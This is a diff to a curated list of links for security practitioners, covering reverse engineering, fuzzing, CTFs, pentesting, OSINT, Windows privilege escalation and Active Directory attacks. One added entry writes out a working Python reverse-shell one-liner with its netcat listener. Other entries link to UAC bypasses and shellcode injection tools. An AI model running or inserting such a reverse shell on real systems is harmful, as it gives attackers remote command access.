@@ -180,6 +180,10 @@
 - [Virtuailor](https://github.com/0xgalz/Virtuailor): IDAPython tool for C++ vtables reconstruction.
 - [Linux Reverse Engineering CTFs for Beginners](https://osandamalith.com/2019/02/11/linux-reverse-engineering-ctfs-for-beginners/).
 - [Python for Reverse Engineering 1](https://icyphox.sh/blog/python-for-re-1/): ELF Binaries
+- [Kaitai Struct](https://formats.kaitai.io/): A new way to develop parsers for binary structures.
+- [findLoop](https://github.com/secrary/findLoop): find possible encryption/decryption or compression/decompression code.
+- [Decompiler Analysis Engine](https://ghidra-decompiler-docs.netlify.com/index.html): Welcome to the Decompiler Analysis Engine. It is a complete library for performing automated data-flow analysis on software, starting from the binary executable.
+- [mkYARA](https://blog.fox-it.com/2019/03/28/mkyara-writing-yara-rules-for-the-lazy-analyst/): Writing YARA rules for the lazy analyst ([github](https://github.com/fox-it/mkyara))
   
 ## Frameworks
 
@@ -278,6 +282,8 @@
 - [tlse](https://github.com/eduardsui/tlse): Single C file TLS 1.2/1.3 implementation, using tomcrypt as crypto library
 - [tinyalloc](https://github.com/thi-ng/tinyalloc): malloc / free replacement for unmanaged, linear memory situations (e.g. WASM, embedded devices...)
 - [Sandboxed API](https://github.com/google/sandboxed-api): Sandboxed API automatically generates sandboxes for C/C++ libraries
+- [HACL*](https://github.com/project-everest/hacl-star): a formally verified cryptographic library written in F*
+- [Villoc](https://github.com/wapiflapi/villoc): Villoc is a heap visualisation tool, it's a python script that renders a static html file.
   
 ### Fuzzing
 
@@ -291,6 +297,7 @@
 - [Dizzy-legacy](https://github.com/ernw/dizzy-legacy): Network and USB protocol fuzzing toolkit.
 - [BFuzz](https://github.com/RootUp/BFuzz): Fuzzing Browsers
 - [Structure-Aware Fuzzing with libFuzzer](https://github.com/google/fuzzer-test-suite/blob/master/tutorial/structure-aware-fuzzing.md) with [fuzzer test suite](https://github.com/google/fuzzer-test-suite)
+- [Fuzzilli](https://github.com/googleprojectzero/fuzzilli): A JavaScript Engine Fuzzer.
 
 ## CTFs
 
@@ -302,6 +309,7 @@
 - [Leap Security](https://leapsecurity.io/)
 - [35c3ctf-challs](https://github.com/niklasb/35c3ctf-challs)
 - [ctf-tasks](https://github.com/j00ru/ctf-tasks): An archive of low-level CTF challenges developed over the years.
+- [$50 million CTF Writeup](https://github.com/manoelt/50M_CTF_Writeup).
 
 ## Phreak
 
@@ -326,6 +334,10 @@
 - [IDA-scripts](https://github.com/secrary/IDA-scripts/): IDAPro scripts/plugins
 - [Why is My Perfectly Good Shellcode Not Working?](https://blog.senr.io/blog/why-is-my-perfectly-good-shellcode-not-working-cache-coherency-on-mips-and-arm): Cache Coherency on MIPS and ARM.
 - [Something about IR optimization](https://brrt-to-the-future.blogspot.com/2019/03/something-about-ir-optimization.html): Hi hackers! Today I want to write about optimizing IR in the MoarVM JIT, and also a little bit about IR design itself.
+- Arm Heap Exploitation, by Azeria:
+  - [AZM Online Arm Assembler](https://azm.azerialabs.com/)
+  - Part 1: [Understanding the Glibc Heap Implementation](https://azeria-labs.com/heap-exploitation-part-1-understanding-the-glibc-heap-implementation/)
+  - Part 2: [Understanding the GLIBC Heap Implementation](https://azeria-labs.com/heap-exploitation-part-2-glibc-heap-free-bins/)
 
 ## Pentesting
 
@@ -381,6 +393,8 @@
 - [sn0int](https://github.com/kpcyrd/sn0int): Semi-automatic OSINT framework and package manager
 - [pown-recon](https://github.com/pownjs/pown-recon): A powerful target reconnaissance framework powered by graph theory.
 - [Micro8](https://github.com/Micropoor/Micro8): The Micro8 series is suitable for junior and intermediate security practitioners, Party B security testing, Party A security self-test, network security enthusiasts, etc., enterprise security protection and improvement, the series complies with: Free, free, shared, open source.
+- A Pentester’s Guide – Part 1: [OSINT – Passive Recon and Discovery of Assets](https://www.sequoiacybersolutions.com/a-pentesters-guide-part-1-osint-passive-recon-and-discovery-of-assets/)
+- A Pentester’s Guide - Part 2: [OSINT – LinkedIn is Not Just for Jobs](https://www.sequoiacybersolutions.com/a-pentesters-guide-part-2-osint-linkedin-is-not-just-for-jobs/)
 
 ### Vulnerability
 
@@ -498,6 +512,8 @@
 - [DET](https://github.com/sensepost/DET): (extensible) Data Exfiltration Toolkit (DET)
 - [awesome-python-login-model](https://github.com/CriseLYJ/awesome-python-login-model): login access for webscrapping.
 - [Hamburglar](https://github.com/needmorecowbell/Hamburglar): collect useful information from urls, directories, and files.
+- [Giggity](https://github.com/needmorecowbell/giggity): grab hierarchical data about a github organization, user, or repo.
+- [I saw a python reverse shell, thought it looked a little long (215 chars), so I came up with my own! (107/98 ch)](https://twitter.com/wolfniya/status/1064465658614874112): nc -lnvp 1234 / python3 -c "# 107, single statement, non-blocking __import__("subprocess").Popen("sh",0,None,*[ __import__("socket").create_connection(("127.0.0.1",1234))]*3)"  or "# 98, separators, blocking import subprocess as S,socket; S.run("sh",0,None,*[ socket.create_connection(("127.0.0.1",1234))]*3)"
 
 ## Forensics
 
@@ -653,6 +669,9 @@
 - [Yet another sdclt UAC bypass](http://blog.sevagas.com/?Yet-another-sdclt-UAC-bypass): As often with UAC, the flaw comes from an auto-elevated process. These processes have the particularity to run with high integrity level without prompting the local admin with the usual UAC window.
 - [awesome-windows-kernel-security-development](https://github.com/ExpLife0011/awesome-windows-kernel-security-development): windows kernel security development.
 - [An introduction to privileged file operation abuse on Windows](https://offsec.provadys.com/intro-to-file-operation-abuse-on-Windows.html): This is a (bit long) introduction on how to abuse file operations performed by privileged processes on Windows for local privilege escalation (user to admin/system), and a presentation of available techniques, tools and procedures to exploit these types of bugs.
+- [Excel4-DCOM](https://github.com/outflanknl/Excel4-DCOM): PowerShell and Cobalt Strike scripts for lateral movement using Excel 4.0 / XLM macros via DCOM (direct shellcode injection in Excel.exe).
+- [ALPC-BypassUAC](https://github.com/DimopoulosElias/alpc-mmc-uac-bypass): UAC Bypass with mmc via alpc.
+- [ThreadBoat](https://github.com/cutesunshine/ThreadBoat): Program uses Thread Execution Hijacking to Inject Native Shellcode into a Standard Win32 Application
   
 #### Active Directory
 
@@ -667,6 +686,7 @@
 - [#TR19 Active Directory Security Track](https://insinuator.net/2019/01/tr19-active-directory-security-track/)
 - [Penetration Testing Active Directory, Part I](https://hausec.com/2019/03/05/penetration-testing-active-directory-part-i/): I’ve had several customers come to me before a pentest and say they think they’re in a good shape because their vulnerability scan shows no critical vulnerabilities and that they’re ready for a pentest, which then leads me to getting domain administrator in fifteen minutes by just exploiting misconfigurations in AD.
 - [Penetration Testing Active Directory, Part II](https://hausec.com/2019/03/12/penetration-testing-active-directory-part-ii/): For most of this part of the series, I will use the rsmith user credentials, as they are low-level, forcing us to do privilege escalation.
+- [Wagging the Dog](https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html): Abusing Resource-Based Constrained Delegation to Attack Active Directory. 
 
 ##### Mimikatz
 
@@ -740,7 +760,8 @@
 - (pt-br) [Hacking Tricks](http://maycon.hacknroll.io/hacking-tricks/2019/01/08/linux-privesc-with-capability.html): Escalação de Privilégio em Linux com Capability
 - [Basic Linux Privilege Escalation](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/): It's just a basic & rough guide.
 - [Linux process infection (part I)](https://www.tarlogic.com/en/blog/linux-process-infection-part-i/):Among the different tasks that a Red Team should carry out, there is one that is remarkable by its intrinsic craftsmanship: putting an APT inside a computer system and ensuring its persistence.
-  
+- [tpotce](https://github.com/dtag-dev-sec/tpotce): T-Pot Universal Installer and ISO Creator.
+
 ## Risk Assessment
 
 - (PT-BR) [Gerenciamento de Risco Cibernético](http://minutodaseguranca.blog.br/gerenciamento-de-risco-de-seguranca-cibernetica/)
@@ -839,6 +860,8 @@
 - [Hostintel](https://www.kitploit.com/2019/03/hostintel-modular-python-application-to.html): A Modular Python Application To Collect Intelligence For Malicious Hosts - [github](https://github.com/keithjjones/hostintel)
 - [DarkNet_ChineseTrading](https://github.com/aoii103/DarkNet_ChineseTrading)
 - [mXtract](https://github.com/rek7/mXtract): Memory Extractor & Analyzer.
+- [commando-vm](https://github.com/fireeye/commando-vm): a fully customized, Windows-based security distribution for penetration testing and red teaming.
+- [FireProx](https://github.com/ustayready/fireprox): AWS API Gateway management tool for creating on the fly HTTP pass-through proxies for unique IP rotation.
 
 ### VPN
 
@@ -895,6 +918,7 @@
 - (ru) [Плакаты по информационной безопасности Российской армии](https://topwar.ru/129563-plakaty-po-informacionnoy-bezopasnosti-rossiyskoy-armii.html): Russian counter information posters.
 - [Kerberos (I)](https://www.tarlogic.com/en/blog/how-kerberos-works/): How does Kerberos work? – Theory
 - [Beagle](https://github.com/yampelo/beagle) is an incident response and digital forensics tool which transforms security logs and data into graphs.
+- [Vulncode-DB project](https://github.com/google/vulncode-db): The vulnerable code database (Vulncode-DB) is a database for vulnerabilities and their corresponding source code if available.
 
 ---
 
@@ -941,6 +965,7 @@
 - [Making C Less Dangerous in the Linux kernel](https://2019.linux.conf.au/schedule/presentation/178/)
 - [Modchips of the State](https://media.ccc.de/v/35c3-9597-modchips_of_the_state#t=22): Hardware implants in the supply-chain - CCC 2018
 - [Workshop-BSidesMunich2018](https://github.com/invictus1306/Workshop-BSidesMunich2018): ARM shellcode and exploit development - BSidesMunich 2018
+- [REhint's Publications](https://github.com/REhints/Publications).
 
 ---
 
@@ -979,7 +1004,8 @@ Some good places to visit:
 - [Pivots & Payloads Board Game](https://www.sans.org/webcasts/introducing-pen-test-poster-pivots-payloads-board-game-109505): Introducing the NEW SANS Pen Test Poster by SANS Institute
 - [Chess Steganography](https://incoherency.co.uk/chess-steg/)
 - [Enigma, the Bombe, and Typex](https://github.com/gchq/CyberChef/wiki/Enigma,-the-Bombe,-and-Typex)
-
+- [How I hacked modern Vending Machines](https://hackernoon.com/how-i-hacked-modern-vending-machines-43f4ae8decec)
+  
 ---
 
 ## CFPs
